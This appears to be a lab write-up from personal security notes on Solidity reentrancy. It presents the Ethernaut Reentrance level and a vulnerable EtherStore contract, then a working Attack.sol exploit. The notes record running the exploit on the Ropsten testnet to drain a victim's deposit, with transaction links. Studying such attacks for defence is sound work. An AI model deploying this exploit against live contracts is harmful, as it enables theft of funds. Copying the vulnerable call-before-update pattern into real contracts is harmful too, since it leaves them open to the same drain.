# Examples

## Ethernaut

```javascript
pragma solidity ^0.4.18;
contract Reentrance {
  mapping(address => uint) public balances;
  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }
  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
  function() public payable {}
}
```

This Ethernaut level exploits this reentrancy issue and the following, additional factors that led to the [DAO hack](http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/):  
• Fallback functions [can be called by anyone & execute malicious code](https://hackernoon.com/ethernaut-lvl-1-walkthrough-how-to-abuse-the-fallback-function-118057b68b56)  
• Malicious external contracts [can abuse withdrawals](https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b)

## EtherStore

{% code title="EtherStore.sol" %}
```javascript
pragma solidity 0.4.18;
contract EtherStore {
    uint256 public withdrawalLimit = 0.1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
```
{% endcode %}

Note: `withdrawLimit` set to 0.1 ether.

Deployed on Ropsten:  
[https://ropsten.etherscan.io/tx/0x34996d7830b216d93e5ecda9468fe472e485dbdb609884405e7f1b5c74533d39](https://ropsten.etherscan.io/tx/0x34996d7830b216d93e5ecda9468fe472e485dbdb609884405e7f1b5c74533d39)

From \(Metamask\):  
`0x109bb3673f445d8b0d2b04436d7b4a630b873b81`  
To \(contract\):  
`0x52b2a43b59a39f4c863aa86da6c6fe73b33bdc73`

{% code title="Attack.sol" %}
```javascript
pragma solidity 0.4.18;

contract EtherStore {
        function depositFunds() public payable {}
        function withdrawFunds(uint256) public {}
}

contract Attack {
    //EtherStore public etherStore;
    EtherStore public etherStore;
        function Attack(address _t) public {
        etherStore = EtherStore(_t);
    }
  function attackEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 0.1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(0.1 ether)();
      // start the magic
      etherStore.withdrawFunds(0.1 ether);
  }
  function collectEther() public {
      msg.sender.transfer(this.balance);
  }
  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 0.1 ether) {
          etherStore.withdrawFunds(0.1 ether);
      }
  }
}
```
{% endcode %}

[https://ropsten.etherscan.io/tx/0x551f6d272274edbef299763343a4daea58438ef20522ed526ecfea7bff59734f](https://ropsten.etherscan.io/tx/0x551f6d272274edbef299763343a4daea58438ef20522ed526ecfea7bff59734f)  
From:  
`0x109bb3673f445d8b0d2b04436d7b4a630b873b81`  
To:  
`0x733146fa7f8b40f4c97d946efeb7bdc9ff69ba6e`

Deposit some Eth from Metamask \(pretend this is some other user/victim\) to EtherStore \(to steal later\):  
[https://ropsten.etherscan.io/tx/0x58671521d2c0df635bf0c3986d53186e38ebe8d4f7d62c2fb5f681e0d938bec6](https://ropsten.etherscan.io/tx/0x58671521d2c0df635bf0c3986d53186e38ebe8d4f7d62c2fb5f681e0d938bec6)  
[![images/23-1.png](../../.gitbook/assets/23-1%20%281%29.png)](./)

I can now check the balance of my Metamask account by calling the `balances` mapping:

[![images/23-2.png](../../.gitbook/assets/23-2%20%281%29.png)](./)

Send 0.1 eth from the Attack.sol contract so that it has some balance to call `withdrawFunds()` later.

The following transaction sends 0.1 eth to Attack.sol's payable attackEtherStore\(\) function which will in turn deposit and subsequently withdraw funds from EtherStore.sol

From:  
`0x109Bb3673f445D8b0d2b04436D7b4a630B873B81`  
To:  
`0x733146Fa7F8B40f4c97d946EfEb7bdc9ff69BA6E`  
Tx:  
[https://ropsten.etherscan.io/tx/0xb6e7cc1fbd093691d75f0a877a5efb998591f88aac938c3e836b6de918a8594a](https://ropsten.etherscan.io/tx/0xb6e7cc1fbd093691d75f0a877a5efb998591f88aac938c3e836b6de918a8594a)

[![images/23-3.png](../../.gitbook/assets/23-3%20%281%29.png)](./)

Once executed, we can see the current balance is 0.1 eth, even though 0.5 was sent

[![images/23-4.png](../../.gitbook/assets/23-4%20%281%29.png)](./)

Because 5 ether were actually sent

Notice that the first Tx in the followig image shows 0.1 ether being sent from the Attack.sol address to EtherStore.sol, followed by 5 outgoing transacions from the EtherStore.sol to Attack.Sol contract. Now Attack.sol has 0.5 eth!!!

[![images/23-5.png](../../.gitbook/assets/23-5%20%281%29.png)](./)

Also the Attack.sol contract has a massive balance on EtherStore, not sure why:

[![images/23-6.png](../../.gitbook/assets/23-6%20%281%29.png)](./)

Calling CollectEther\(\) Sends those 0.5 eth back to our wallet address!

[https://ropsten.etherscan.io/tx/0xf11dcf8de8bed562a8b4f0d977efbe2db8940adee4745c0400e8f44b95ffed93](https://ropsten.etherscan.io/tx/0xf11dcf8de8bed562a8b4f0d977efbe2db8940adee4745c0400e8f44b95ffed93)  
[![images/23-7.png](../../.gitbook/assets/23-7%20%281%29.png)](./)

This becomes clearer is we export the internal transactions to csv:

[![images/23-8.png](../../.gitbook/assets/23-8%20%281%29.png)](./)

